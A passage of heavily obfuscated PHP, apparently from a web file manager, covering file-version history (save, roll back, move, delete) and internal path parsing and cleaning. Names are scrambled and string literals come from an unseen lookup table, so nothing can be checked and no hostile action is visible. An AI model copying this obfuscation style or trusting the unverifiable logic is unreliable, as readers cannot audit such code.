self::log($GLOBALS[$Çç’“Ô™[1244]] . $Çç’“Ô™[1341] . $ëí£Á±­); return $ëí£Á±­; } private static function pathHistory($æÇä´É¦) { $Ÿ¤¼‰„Á =& $_SERVER[É¨™èà]; $›ÎÂÇ×ë = self::$_historyBase . ltrim(KodIO::clear($æÇä´É¦), $Ÿ¤¼‰„Á[8]); $›ÎÂÇ×ë = str_replace(array($Ÿ¤¼‰„Á[1342]), array($Ÿ¤¼‰„Á[1343]), $›ÎÂÇ×ë); return $›ÎÂÇ×ë; } public static function log($Àİü¨‹Û) { } public static function historyCount($°ó¸‹¸¶) { $ÆÙ¿±¤Ğ =& $_SERVER[É¨™èà]; $¼ş®°ª½ = array(); $ş×£Ì¿¶ = array(); foreach ($°ó¸‹¸¶ as $ÌŞ²Û±) { $ÖîĞÁÕÔ = get_path_father($ÌŞ²Û±); if (!$ş×£Ì¿¶[$ÖîĞÁÕÔ]) { $ş×£Ì¿¶[$ÖîĞÁÕÔ] = array(); } $ş×£Ì¿¶[$ÖîĞÁÕÔ][] = get_path_this($ÌŞ²Û±); } foreach ($ş×£Ì¿¶ as $ÖîĞÁÕÔ => $ÏêåÇ‘Ù) { $²Ñ†èó = self::parsePath($ÖîĞÁÕÔ); if (!$²Ñ†èó) { continue; } foreach ($ÏêåÇ‘Ù as $ïß´ñüÛ) { $©†¶Ö† = self::listData(rtrim($²Ñ†èó, $ÆÙ¿±¤Ğ[8]) . $ÆÙ¿±¤Ğ[8] . $ïß´ñüÛ, !1); if ($©†¶Ö† && $©†¶Ö†[$ÆÙ¿±¤Ğ[456]]) { $¼ş®°ª½[rtrim($ÖîĞÁÕÔ, $ÆÙ¿±¤Ğ[8]) . $ÆÙ¿±¤Ğ[8] . $ïß´ñüÛ] = count($©†¶Ö†[$ÆÙ¿±¤Ğ[456]]); } } } return $¼ş®°ª½; } public static function add($áª§§ú²) { $†¹åÊ˜Ì =& $_SERVER[É¨™èà]; $ÚÈèÑŒ» = self::listData($áª§§ú²); if (!$ÚÈèÑŒ») { return; } $·íº³Í° = Model($†¹åÊ˜Ì[861])->get($†¹åÊ˜Ì[1344]); $Ø˜˜…Ú‡ = intval($GLOBALS[$†¹åÊ˜Ì[6]][$†¹åÊ˜Ì[92]][$†¹åÊ˜Ì[1322]]); $Çï²†âá = $·íº³Í° == $†¹åÊ˜Ì[1345] ? min(5, $Ø˜˜…Ú‡) : $Ø˜˜…Ú‡; if ($Ø˜˜…Ú‡ <= 0) { return; } $‘ÉÊã¬— = IO::info($áª§§ú²); $¬º¤ı– = $ÚÈèÑŒ»[$†¹åÊ˜Ì[456]]; if ($‘ÉÊã¬—[$†¹åÊ˜Ì[79]] == 0) { return; } if ($‘ÉÊã¬—[$†¹åÊ˜Ì[79]] >= 1024 * 1024 * 500) { return !1; } $İÖş‘‚Ò = IO::hashSimple($áª§§ú²); if ($¬º¤ı– && $¬º¤ı–[0][$†¹åÊ˜Ì[687]] == $İÖş‘‚Ò) { return !0; } if (array_key_exists($†¹åÊ˜Ì[236], $‘ÉÊã¬—) && !$‘ÉÊã¬—[$†¹åÊ˜Ì[236]]) { return !1; } $û÷²ç—à = short_id(time()); $¹½áô× = array($†¹åÊ˜Ì[485] => $û÷²ç—à, $†¹åÊ˜Ì[687] => $İÖş‘‚Ò, $†¹åÊ˜Ì[32] => $‘ÉÊã¬—[$†¹åÊ˜Ì[32]] . $†¹åÊ˜Ì[10] . date($†¹åÊ˜Ì[1346]) . rand_string(1), $†¹åÊ˜Ì[79] => $‘ÉÊã¬—[$†¹åÊ˜Ì[79]], $†¹åÊ˜Ì[537] => USER_ID, $†¹åÊ˜Ì[234] => time(), $†¹åÊ˜Ì[1347] => $†¹åÊ˜Ì[12]); IO::mkdir($ÚÈèÑŒ»[$†¹åÊ˜Ì[1348]]); $±óË€‘ = IO::copy($áª§§ú², $ÚÈèÑŒ»[$†¹åÊ˜Ì[1348]], !1, $¹½áô×[$†¹åÊ˜Ì[32]]); if (!$±óË€‘) { self::clearEmptyFolder($ÚÈèÑŒ»[$†¹åÊ˜Ì[1348]]); return !1; } array_unshift($¬º¤ı–, $¹½áô×); if (count($¬º¤ı–) > $Çï²†âá) { $÷çÕç‘Ë = array_slice($¬º¤ı–, $Çï²†âá); foreach ($÷çÕç‘Ë as $¹óĞµŒ) { IO::remove($ÚÈèÑŒ»[$†¹åÊ˜Ì[1348]] . $¹óĞµŒ[$†¹åÊ˜Ì[32]]); } $¬º¤ı– = array_slice($¬º¤ı–, 0, $Çï²†âá); } return self::saveData($ÚÈèÑŒ»[$†¹åÊ˜Ì[1349]], $¬º¤ı–); } public static function remove($ùì†ˆÙ, $“óá…¯Å) { $Ø›ñÔÕı =& $_SERVER[É¨™èà]; $üÂ–ºÒ¥ = self::listData($ùì†ˆÙ); $Ì„ãõâ¯ = array(); if (!$üÂ–ºÒ¥) { return !1; } foreach ($üÂ–ºÒ¥[$Ø›ñÔÕı[456]] as $¥³“£ò) { if ($¥³“£ò[$Ø›ñÔÕı[485]] == $“óá…¯Å) { IO::remove($üÂ–ºÒ¥[$Ø›ñÔÕı[1348]] . $¥³“£ò[$Ø›ñÔÕı[32]]); continue; } $Ì„ãõâ¯[] = $¥³“£ò; } return self::saveData($üÂ–ºÒ¥[$Ø›ñÔÕı[1349]], $Ì„ãõâ¯); } public static function clear($„¹³Ğ‡å, $–½ÉË×Ÿ = true) { $Á£Ğ€ÁÊ =& $_SERVER[É¨™èà]; $úÛÉ¢Û = self::listData($„¹³Ğ‡å, $–½ÉË×Ÿ); if (!$úÛÉ¢Û) { return !1; } foreach ($úÛÉ¢Û[$Á£Ğ€ÁÊ[456]] as $Ú˜İÙá¦) { IO::remove($úÛÉ¢Û[$Á£Ğ€ÁÊ[1348]] . $Ú˜İÙá¦[$Á£Ğ€ÁÊ[32]]); } return self::saveData($úÛÉ¢Û[$Á£Ğ€ÁÊ[1349]], array()); } public static function moveHistory($’í¢—ÄŠ, $Ãı„‘­ò = '', $¹Àúê™£ = '') { $ÄÂ­’òñ =& $_SERVER[É¨™èà]; $œ‰©“õ÷ = self::listData($’í¢—ÄŠ, !1); if (!$œ‰©“õ÷ || !$œ‰©“õ÷[$ÄÂ­’òñ[456]]) { return !1; } $¢ĞÊ•’ = $ÄÂ­’òñ[1336]; $Ãı„‘­ò = $Ãı„‘­ò ? $Ãı„‘­ò : get_path_this($’í¢—ÄŠ); $¹Àúê™£ = $¹Àúê™£ ? $¹Àúê™£ : $œ‰©“õ÷[$ÄÂ­’òñ[1348]]; $ş¤–ªÑå = substr(get_path_this($œ‰©“õ÷[$ÄÂ­’òñ[1349]]), 0, -strlen($¢ĞÊ•’)); foreach ($œ‰©“õ÷[$ÄÂ­’òñ[456]] as $‰¾è¤Ÿ => $‰¢ğÆ÷Ã) { $Ì¡øã–“ = $Ãı„‘­ò . substr($‰¢ğÆ÷Ã[$ÄÂ­’òñ[32]], strlen($ş¤–ªÑå)); $æÚÛ²ãñ = IO::move($œ‰©“õ÷[$ÄÂ­’òñ[1348]] . $‰¢ğÆ÷Ã[$ÄÂ­’òñ[32]], $¹Àúê™£, !1, $Ì¡øã–“); if ($æÚÛ²ãñ) { $œ‰©“õ÷[$ÄÂ­’òñ[456]][$‰¾è¤Ÿ][$ÄÂ­’òñ[32]] = $Ì¡øã–“; } } $œ‰©“õ÷[$ÄÂ­’òñ[1349]] = IO::move($œ‰©“õ÷[$ÄÂ­’òñ[1349]], $¹Àúê™£, !1, $Ãı„‘­ò . $¢ĞÊ•’); self::saveData($œ‰©“õ÷[$ÄÂ­’òñ[1349]], $œ‰©“õ÷[$ÄÂ­’òñ[456]]); self::clearEmptyFolder($œ‰©“õ÷[$ÄÂ­’òñ[1348]]); } public static function rollback($ßâƒ¿‹, $ÇÉâÖ™Æ) { $ã¢Õ¤Ò¾ =& $_SERVER[É¨™èà]; $ğşêÖùå = self::listData($ßâƒ¿‹); if (!$ğşêÖùå) { return; } $à™Ëƒ’É = IO::info($ßâƒ¿‹); foreach ($ğşêÖùå[$ã¢Õ¤Ò¾[456]] as $¥É…ºçÂ => $šã„ïÑ•) { if ($šã„ïÑ•[$ã¢Õ¤Ò¾[485]] == $ÇÉâÖ™Æ) { self::add($ßâƒ¿‹); $¥¹ŞĞùü = $ğşêÖùå[$ã¢Õ¤Ò¾[1348]] . $šã„ïÑ•[$ã¢Õ¤Ò¾[32]]; $ÜƒÆ°Ø© = IO::copy($¥¹ŞĞùü, IO::pathFather($ßâƒ¿‹), REPEAT_REPLACE, $à™Ëƒ’É[$ã¢Õ¤Ò¾[32]]); if ($ÜƒÆ°Ø©) { self::remove($ßâƒ¿‹, $ÇÉâÖ™Æ); } return $ÜƒÆ°Ø©; } } return !1; } public static function setDetail($¨ã—Éõñ, $¼ê©Œµ€, $©¦äÖ”‚) { $‡ŸÖ»¯ =& $_SERVER[É¨™èà]; $”›Œœ = self::listData($¨ã—Éõñ); if (!$”›Œœ) { return; } foreach ($”›Œœ[$‡ŸÖ»¯[456]] as $Ìª¿›• => $¼õ­¢À) { if ($¼õ­¢À[$‡ŸÖ»¯[485]] == $¼ê©Œµ€) { $”›Œœ[$‡ŸÖ»¯[456]][$Ìª¿›•][$‡ŸÖ»¯[1347]] = $©¦äÖ”‚; self::saveData($”›Œœ[$‡ŸÖ»¯[1349]], $”›Œœ[$‡ŸÖ»¯[456]]); return !0; } } return !1; } public static function fileInfo($Ç¦ıŒÃü, $šİ³áñ©) { $„¬ö³ãà =& $_SERVER[É¨™èà]; $—–±È» = self::listData($Ç¦ıŒÃü); if (!$—–±È») { show_json(LNG($„¬ö³ãà[108]), !1); } $¹º€Áëµ = $„¬ö³ãà[12]; foreach ($—–±È»[$„¬ö³ãà[456]] as $ç®±‚™Ç => $Ì‹å®åæ) { if ($Ì‹å®åæ[$„¬ö³ãà[485]] != $šİ³áñ©) { continue; } $¹º€Áëµ = $—–±È»[$„¬ö³ãà[1348]] . $Ì‹å®åæ[$„¬ö³ãà[32]]; break; } if (!$¹º€Áëµ) { show_json(LNG($„¬ö³ãà[108]), !1); } return IO::info($¹º€Áëµ); } public static function fileOut($—ßöĞ“, $ã½Îµ¥‹, $ÁÂÇ–Å = false) { $•¹¡Œ¹í =& $_SERVER[É¨™èà]; $´­§ÆÎ = self::fileInfo($—ßöĞ“, $ã½Îµ¥‹); $º»Ä¼ÀÅ =& $GLOBALS[$•¹¡Œ¹í[7]]; $ÁÂÇ–Å = isset($º»Ä¼ÀÅ[$•¹¡Œ¹í[1299]]) && $º»Ä¼ÀÅ[$•¹¡Œ¹í[1299]] == 1; if (isset($º»Ä¼ÀÅ[$•¹¡Œ¹í[33]]) && $º»Ä¼ÀÅ[$•¹¡Œ¹í[33]] == $•¹¡Œ¹í[1350]) { return IO::fileOutImage($´­§ÆÎ[$•¹¡Œ¹í[87]], $º»Ä¼ÀÅ[$•¹¡Œ¹í[1351]]); } IO::fileOut($´­§ÆÎ[$•¹¡Œ¹í[87]], $ÁÂÇ–Å, get_path_this($—ßöĞ“)); } public static function listData($¹õ¡ò¯, $¬Êš©Çè = true) { $İËå‚ŠŒ =& $_SERVER[É¨™èà]; if ($¬Êš©Çè && !IO::exist($¹õ¡ò¯)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¹õ¡ò¯, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ƒÂÂØ€À = self::pathHistory($¹õ¡ò¯); $¼éßÕ = array($İËå‚ŠŒ[1349] => $ƒÂÂØ€À . $İËå‚ŠŒ[1336], $İËå‚ŠŒ[1348] => rtrim(get_path_father($ƒÂÂØ€À), $İËå‚ŠŒ[8]) . $İËå‚ŠŒ[8], $İËå‚ŠŒ[456] => array()); $–óöŠ² = IO::getContent($¼éßÕ[$İËå‚ŠŒ[1349]]); if ($–óöŠ²) { $ÈµğêÒœ = json_decode($–óöŠ², !0); if (is_array($ÈµğêÒœ)) { $¼éßÕ[$İËå‚ŠŒ[456]] = $ÈµğêÒœ; } } return $¼éßÕ; } private static function saveData($ù¤´µú, $³êİ³ç¡) { $Ññ‰ˆ¿– =& $_SERVER[É¨™èà]; self::log($Ññ‰ˆ¿–[1352] . $ù¤´µú . $Ññ‰ˆ¿–[74] . count($³êİ³ç¡), $Ññ‰ˆ¿–[842]); if ($³êİ³ç¡) { return IO::setContent($ù¤´µú, json_encode($³êİ³ç¡)); } $Ô§ËòÌŠ = IO::pathFather($ù¤´µú); IO::remove($ù¤´µú); self::clearEmptyFolder($Ô§ËòÌŠ); return !0; } public static function clearEmptyFolder($„’Ş‚ƒı) { $ÊŞ‚·ÊÀ =& $_SERVER[É¨™èà]; if (trim($„’Ş‚ƒı, $ÊŞ‚·ÊÀ[8]) == trim(self::$_historyBase, $ÊŞ‚·ÊÀ[8])) { return; } $ò«Ñ€åÛ = IO::pathFather($„’Ş‚ƒı); $ÉáŞĞ¾ = IO::has($„’Ş‚ƒı, !0); if ($ÉáŞĞ¾[$ÊŞ‚·ÊÀ[242]] > 0 || $ÉáŞĞ¾[$ÊŞ‚·ÊÀ[243]] > 0) { return; } IO::remove($„’Ş‚ƒı); self::clearEmptyFolder($ò«Ñ€åÛ); } private static function getBasePath() { $…Ô«ÃÑ€ =& $_SERVER[É¨™èà]; $­¦ª—• = Model($…Ô«ÃÑ€[1353])->get($…Ô«ÃÑ€[1354]); if ($­¦ª—•) { if (!IO::exist($­¦ª—•)) { IO::mkdir($­¦ª—•); } if (get_path_this($­¦ª—•) == $…Ô«ÃÑ€[1339]) { $¯€ıˆ—½ = $…Ô«ÃÑ€[1355] . rand_string(8); @rename($­¦ª—•, get_path_father($­¦ª—•) . $…Ô«ÃÑ€[8] . $¯€ıˆ—½); $­¦ª—• = DATA_PATH . $¯€ıˆ—½ . $…Ô«ÃÑ€[8]; file_put_contents(DATA_PATH . $…Ô«ÃÑ€[1286], $…Ô«ÃÑ€[12]); Model($…Ô«ÃÑ€[1353])->set($…Ô«ÃÑ€[1354], $­¦ª—•); } return $­¦ª—•; } $­¦ª—• = DATA_PATH . $…Ô«ÃÑ€[1355] . rand_string(8) . $…Ô«ÃÑ€[8]; $­¦ª—• = IO::mkdir($­¦ª—•); $­¦ª—• = rtrim($­¦ª—•, $…Ô«ÃÑ€[8]) . $…Ô«ÃÑ€[8]; file_put_contents($­¦ª—• . $…Ô«ÃÑ€[1286], $…Ô«ÃÑ€[12]); file_put_contents(DATA_PATH . $…Ô«ÃÑ€[1286], $…Ô«ÃÑ€[12]); Model($…Ô«ÃÑ€[1353])->set($…Ô«ÃÑ€[1354], $­¦ª—•); return $­¦ª—•; } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\165\163\145\x72\122\x65\x63\171\143\x6c\x65\175"; const KOD_USER_FAV = "\173\165\x73\145\x72\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\162\106\x69\x6c\x65\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\162\x46\151\x6c\145\x54\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\x70\122\157\157\x74\x53\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\x72\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\x53\150\141\162\145\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\162\145\124\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\141\162\145\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\141\x72\x65\111\164\x65\x6d\x4c\151\x6e\153\175"; const KOD_SEARCH = "\173\x73\x65\x61\x72\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\157\143\153\x7d"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\162\x52\145\156\143\145\156\164\175"; const KOD_USER_DRIVER = "\173\144\x72\x69\x76\145\x72\175"; public static function typeList() { $›±€ô‡¸ =& $_SERVER[É¨™èà]; return array($›±€ô‡¸[1356] => self::KOD_SOURCE, $›±€ô‡¸[1357] => self::KOD_USER_RECYCLE, $›±€ô‡¸[1358] => self::KOD_USER_FAV, $›±€ô‡¸[1359] => self::KOD_USER_FILE_TAG, $›±€ô‡¸[1360] => self::KOD_USER_FILE_TYPE, $›±€ô‡¸[1361] => self::KOD_GROUP_ROOT_SELF, $›±€ô‡¸[1362] => self::KOD_USER_SHARE, $›±€ô‡¸[1363] => self::KOD_USER_SHARE_LINK, $›±€ô‡¸[1364] => self::KOD_USER_SHARE_TO_ME, $›±€ô‡¸[1365] => self::KOD_SHARE_ITEM, $›±€ô‡¸[1366] => self::KOD_SHARE_LINK, $›±€ô‡¸[1367] => self::KOD_SEARCH, $›±€ô‡¸[1368] => self::KOD_BLOCK, $›±€ô‡¸[1369] => self::KOD_IO, $›±€ô‡¸[1370] => self::KOD_USER_RECENT, $›±€ô‡¸[1371] => self::KOD_USER_DRIVER); } public static function parse($—§¯˜Øò) { $¨˜Ëùó· =& $_SERVER[É¨™èà]; $—§¯˜Øò = self::clear($—§¯˜Øò); $ÒıêÕ»ü = array_values(self::typeList()); preg_match($¨˜Ëùó·[1372], $—§¯˜Øò, $²èñÎ„Æ); $Ö¿ÏÕ³š = array($¨˜Ëùó·[506] => !1, $¨˜Ëùó·[1373] => !1, $¨˜Ëùó·[503] => !1, $¨˜Ëùó·[87] => $—§¯˜Øò, $¨˜Ëùó·[1270] => !1, $¨˜Ëùó·[1269] => $¨˜Ëùó·[12]); if (is_array($²èñÎ„Æ) && count($²èñÎ„Æ) == 5) { $Ì€ˆı¸Š = $¨˜Ëùó·[1374] . $²èñÎ„Æ[2] . $¨˜Ëùó·[413]; if (in_array($Ì€ˆı¸Š, $ÒıêÕ»ü)) { $Ö¿ÏÕ³š[$¨˜Ëùó·[1270]] = $²èñÎ„Æ[1]; $Ö¿ÏÕ³š[$¨˜Ëùó·[33]] = $Ì€ˆı¸Š; $Ö¿ÏÕ³š[$¨˜Ëùó·[1375]] = substr($Ì€ˆı¸Š, 1, -1); $Ö¿ÏÕ³š[$¨˜Ëùó·[485]] = $²èñÎ„Æ[3]; } $Ö¿ÏÕ³š[$¨˜Ëùó·[1269]] = $²èñÎ„Æ[4]; } if ($Ö¿ÏÕ³š[$¨˜Ëùó·[506]] == self::KOD_SOURCE) { $Ö¿ÏÕ³š[$¨˜Ëùó·[1273]] = $Ö¿ÏÕ³š[$¨˜Ëùó·[485]]; } $éØıÓ·– = array($¨˜Ëùó·[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ö¿ÏÕ³š[$¨˜Ëùó·[1338]] = in_array($Ö¿ÏÕ³š[$¨˜Ëùó·[33]], $éØıÓ·–); return $Ö¿ÏÕ³š; } public static function isTruePath($åíÒ¼ğ¢) { $øÊó—Öû =& $_SERVER[É¨™èà]; if (substr($åíÒ¼ğ¢, 0, 1) != $øÊó—Öû[1374]) { return !0; } if (strpos($åíÒ¼ğ¢, $øÊó—Öû[493]) === 0) { return !0; } if (strpos($åíÒ¼ğ¢, $øÊó—Öû[1342]) === 0) { return !0; } if (strpos($åíÒ¼ğ¢, $øÊó—Öû[1376]) === 0) { return !0; } if (strpos($åíÒ¼ğ¢, $øÊó—Öû[1377]) === 0) { return !0; } if (strpos($åíÒ¼ğ¢, $øÊó—Öû[1378]) === 0) { return !0; } return !1; } public static function clear($à¯™Èó©) { $´•Ê“¸÷ =& $_SERVER[É¨™èà]; $à¯™Èó© = str_replace(array($´•Ê“¸÷[1173], $´•Ê“¸÷[288]), $´•Ê“¸÷[53], $à¯™Èó©); $à¯™Èó© = str_replace($´•Ê“¸÷[100], $´•Ê“¸÷[8], $à¯™Èó©); $ÕÚ“¿»† = $´•Ê“¸÷[1379]; if (substr($à¯™Èó©, 0, 3) == $´•Ê“¸÷[1380]) { $à¯™Èó© = substr($à¯™Èó©, 3); } while (strstr($à¯™Èó©, $ÕÚ“¿»†)) { $à¯™Èó© = str_replace($ÕÚ“¿»†, $´•Ê“¸÷[8], $à¯™Èó©); } $à¯™Èó© = preg_replace($´•Ê“¸÷[1381], $´•Ê“¸÷[8], $à¯™Èó©); if ($à¯™Èó© == $´•Ê“¸÷[8]) { return $´•Ê“¸÷[8]; } $à¯™Èó© = rtrim($à¯™Èó©, $´•Ê“¸÷[8]); return $à¯™Èó©; } public static function pathTrue($¤ÒÃÆªÍ) { $³Òî¥Ì­ =& $_SERVER[É¨™èà]; if (!$¤ÒÃÆªÍ) { return $³Òî¥Ì­[12]; } $¤ÒÃÆªÍ = str_replace($³Òî¥Ì­[257], $³Òî¥Ì­[8], str_replace($³Òî¥Ì­[1382], $³Òî¥Ì­[8], $¤ÒÃÆªÍ)); $¤ÒÃÆªÍ = str_replace($³Òî¥Ì­[257], $³Òî¥Ì­[8], str_replace($³Òî¥Ì­[1382], $³Òî¥Ì­[8], $¤ÒÃÆªÍ)); if (!strstr($¤ÒÃÆªÍ, $³Òî¥Ì­[1380])) { return $¤ÒÃÆªÍ; } $ÈÀÎì× = explode($³Òî¥Ì­[8], $¤ÒÃÆªÍ); foreach ($ÈÀÎì× as $¥•†éãŞ => $ŸŸÃ®Û¨) { if ($ŸŸÃ®Û¨ !== $³Òî¥Ì­[1383]) { continue; } for ($†ó«½¼Ø = $¥•†éãŞ; $†ó«½¼Ø >= 0; $†ó«½¼Ø--) { if ($ÈÀÎì×[$†ó«½¼Ø] === $³Òî¥Ì­[10] || $ÈÀÎì×[$†ó«½¼Ø] === $³Òî¥Ì­[1383] || $ÈÀÎì×[$†ó«½¼Ø] === -1) { continue; } if ($ÈÀÎì×[$†ó«½¼Ø] === $³Òî¥Ì­[12]) { $ÈÀÎì×[$¥•†éãŞ] = -1; break; } $ÈÀÎì×[$¥•†éãŞ] = -1; $ÈÀÎì×[$†ó«½¼Ø] = -1; break; } } $ÎÊƒ÷Óê = array(); foreach ($ÈÀÎì× as $ŸŸÃ®Û¨) { if ($ŸŸÃ®Û¨ !== -1) { $ÎÊƒ÷Óê[] = $ŸŸÃ®Û¨; } } $¹½ù«½€ = implode($³Òî¥Ì­[8], $ÎÊƒ÷Óê); if (strpos($¹½ù«½€, $³Òî¥Ì­[1384]) === 0) { $¹½ù«½€ = $³Òî¥Ì­[1380] . substr($¹½ù«½€, strlen($³Òî¥Ì­[1384])); } return $¹½ù«½€; } public static function pathUrlClear($ô°ììüç) { $¦©Âû =& $_SERVER[É¨™èà]; if (!$ô°ììüç) { return $ô°ììüç; } $ô°ììüç = rawurldecode($ô°ììüç); $ô°ììüç = str_replace($¦©Âû[1382], $¦©Âû[8], $ô°ììüç); if (strpos($ô°ììüç, $¦©Âû[76]) > 0) { $ô°ììüç = substr($ô°ììüç, 0, strpos($ô°ììüç, $¦©Âû[76])); } if (strpos($ô°ììüç, $¦©Âû[1385]) > 0) { $ô°ììüç = substr($ô°ììüç, 0, strpos($ô°ììüç, $¦©Âû[1385])); } return $ô°ììüç; } public static function sourceID($æÙğ•¨Ù) { $›Ë·Œ‡¥ =& $_SERVER[É¨™èà]; $ä÷Õı¬à = self::parse($æÙğ•¨Ù); if ($ä÷Õı¬à[$›Ë·Œ‡¥[33]] !== self::KOD_SOURCE) { show_json(LNG($›Ë·Œ‡¥[1386]), !1); } return $ä÷Õı¬à[$›Ë·Œ‡¥[485]]; } public static function make($ÍşÛäÆÈ) { if (!$ÍşÛäÆÈ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÍşÛäÆÈ)); } public static function makeShare($ù¼ñºââ, $Ë¡¸ºæÁ) { return self::makePath(self::KOD_SHARE_ITEM, $ù¼ñºââ, $Ë¡¸ºæÁ); } public static function makeFileTypePath($å‚µ¯¯©) { return self::makePath(self::KOD_USER_FILE_TYPE, $å‚µ¯¯©); } public static function makeFileTagPath($ÉºëŒİ) { return self::makePath(self::KOD_USER_FILE_TAG, $ÉºëŒİ); } public static function makePath($úáŒÚ, $úÖ¡„­ = '', $Ñ©Ìƒ´ = '') { $“áãÆ‘µ =& $_SERVER[É¨™èà]; $Ã§Ò§™ë = substr($úáŒÚ, 1, -1); $ÛÎ‡ºì = $“áãÆ‘µ[1387] . $Ã§Ò§™ë . $“áãÆ‘µ[1388] . $úÖ¡„­ . $“áãÆ‘µ[1389]; $ÛÎ‡ºì = $Ñ©Ìƒ´ ? $ÛÎ‡ºì . $Ñ©Ìƒ´ . $“áãÆ‘µ[8] : $ÛÎ‡ºì; return $ÛÎ‡ºì; } public static function hashPath($Ââ§—‘Ê, $’û¡Èä³ = false) { $è©¦¸Š˜ =& $_SERVER[É¨™èà]; if (!$Ââ§—‘Ê) { return $è©¦¸Š˜[12]; } $£ôé«Íà = is_array($Ââ§—‘Ê) ? $Ââ§—‘Ê : IO::info($Ââ§—‘Ê); $®òï–µÒ = _get($£ôé«Íà, $è©¦¸Š˜[1390], $è©¦¸Š˜[12]); if (!$®òï–µÒ && isset($£ôé«Íà[$è©¦¸Š˜[553]])) { $®òï–µÒ = $£ôé«Íà[$è©¦¸Š˜[553]]; } if (!$®òï–µÒ && isset($£ôé«Íà[$è©¦¸Š˜[238]])) { $®òï–µÒ = trim($£ôé«Íà[$è©¦¸Š˜[238]], $è©¦¸Š˜[121]); } if ($®òï–µÒ) { return $®òï–µÒ; } if (!$®òï–µÒ && isset($£ôé«Íà[$è©¦¸Š˜[194]]) && $£ôé«Íà[$è©¦¸Š˜[194]]) { $£ôé«Íà = IO::info(KodIO::make($£ôé«Íà[$è©¦¸Š˜[194]])); $®òï–µÒ = _get($£ôé«Íà, $è©¦¸Š˜[1390], $è©¦¸Š˜[12]); if (!$®òï–µÒ && isset($£ôé«Íà[$è©¦¸Š˜[553]])) { $®òï–µÒ = $£ôé«Íà[$è©¦¸Š˜[553]]; } } $°Øß÷©„ = md5($£ôé«Íà[$è©¦¸Š˜[87]] . $£ôé«Íà[$è©¦¸Š˜[79]] . $£ôé«Íà[$è©¦¸Š˜[88]]); $Êøè°× = $°Øß÷©„ . $è©¦¸Š˜[1391]; $®òï–µÒ = $®òï–µÒ ? $®òï–µÒ : Cache::get($Êøè°×); if (!$®òï–µÒ && $’û¡Èä³) { $®òï–µÒ = IO::hashSimple($£ôé«Íà[$è©¦¸Š˜[87]]); Cache::set($Êøè°×, $®òï–µÒ ? $®òï–µÒ : $°Øß÷©„, 3600 * 24 * 30); } return $®òï–µÒ ? $®òï–µÒ : $°Øß÷©„; } public static function hashPathSafe($€öÄóëè, $ëÌ±áÛ‘ = false) { $ãıöâ£Æ =& $_SERVER[É¨™èà]; $¦´Çä¤Ù = self::hashPath($€öÄóëè, $ëÌ±áÛ‘); return md5($¦´Çä¤Ù . $ãıöâ£Æ[1392] . Model($ãıöâ£Æ[861])->get($ãıöâ£Æ[862])); } public static function initSystemPath() { $ÃİöšòÅ =& $_SERVER[É¨™èà]; if (defined($ÃİöšòÅ[1393])) { return; } define($ÃİöšòÅ[1393], self::systemPath($ÃİöšòÅ[192])); define($ÃİöšòÅ[1394], self::systemPath($ÃİöšòÅ[1395])); define($ÃİöšòÅ[1396], self::systemPath($ÃİöšòÅ[1397])); define($ÃİöšòÅ[1398], self::systemPath($ÃİöšòÅ[1399])); IOHistory::bindEvent(); } public static function systemPath($„¥ı…Çß) { $˜ª¹‡­… =& $_SERVER[É¨™èà]; $åÛì›óÉ = $˜ª¹‡­…[1400] . ucfirst($„¥ı…Çß); $ùÉÂØ‹ = Model($˜ª¹‡­…[861])->get($åÛì›óÉ); if ($ùÉÂØ‹) { return $ùÉÂØ‹; } if ($„¥ı…Çß == $˜ª¹‡­…[192]) { $ùÉÂØ‹ = self::make(Model($˜ª¹‡­…[921])->systemRootPathAdd($˜ª¹‡­…[620])); } else { $ùÉÂØ‹ = self::systemPath($˜ª¹‡­…[192]); $ßüËïŸæ = self::sourceID($ùÉÂØ‹); $ùÉÂØ‹ = self::make(Model($˜ª¹‡­…[921])->mkdir($ßüËïŸæ, $„¥ı…Çß)); } Model($˜ª¹‡­…[861])->set($åÛì›óÉ, $ùÉÂØ‹); return $ùÉÂØ‹; } public static function systemFolder($Ã£áè) { $£Ú”â‹È = IO_PATH_SYSTEM_SOURCE . $Ã£áè; $å½¾üş = Cache::get($£Ú”â‹È); if (!$å½¾üş) { $ùÓŠ¼µ = IO::infoFullSimple($£Ú”â‹È); if (!$ùÓŠ¼µ) { $å½¾üş = IO::mkdir($£Ú”â‹È, REPEAT_SKIP); } else { $å½¾üş = $ùÓŠ¼µ[$_SERVER[É¨™èà][87]]; } Cache::set($£Ú”â‹È, $å½¾üş, 3600 * 10); } return $å½¾üş; } public static function defaultDriver() { return Model($_SERVER[É¨™èà][858])->defaultDriver(); } public static function defaultDriverInit() { $ÄÓŠ«ìå =& $_SERVER[É¨™èà]; static $²ª¥‚Ì = false; if ($²ª¥‚Ì) { return $²ª¥‚Ì; } $ÎúÑİê— = self::defaultDriver(); $²ª¥‚Ì = IO::init($ÄÓŠ«ìå[1401] . $ÎúÑİê—[$ÄÓŠ«ìå[485]] . $ÄÓŠ«ìå[1389]); return $²ª¥‚Ì; } public static function fileTypeList() { $ÜÙÃªÑ» =& $_SERVER[É¨™èà]; $ÂåÅèà¥ = $GLOBALS[$ÜÙÃªÑ»[6]][$ÜÙÃªÑ»[1402]]; foreach ($ÂåÅèà¥ as $ßŸÆøñ… => $ÊÂ¬åšÀ) { $í€ÇˆÊ‹ = $ÜÙÃªÑ»[1403] . $ßŸÆøñ…; $³†ó°ºÖ = 